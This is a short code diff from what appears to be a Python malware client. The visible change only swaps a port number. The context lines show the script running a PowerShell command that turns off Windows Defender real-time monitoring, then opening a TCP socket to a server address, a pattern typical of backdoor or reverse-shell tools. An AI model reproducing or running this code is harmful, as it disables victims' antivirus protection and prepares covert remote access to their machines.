@@ -18,7 +18,7 @@ def main():
     run_powershell_command("Set-MpPreference -DisableRealtimeMonitoring $true")
     # Server address and port
     host = '127.0.0.1'
-    port = 12345
+    port = 8080
     check = "text"
     # Create a socket object
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
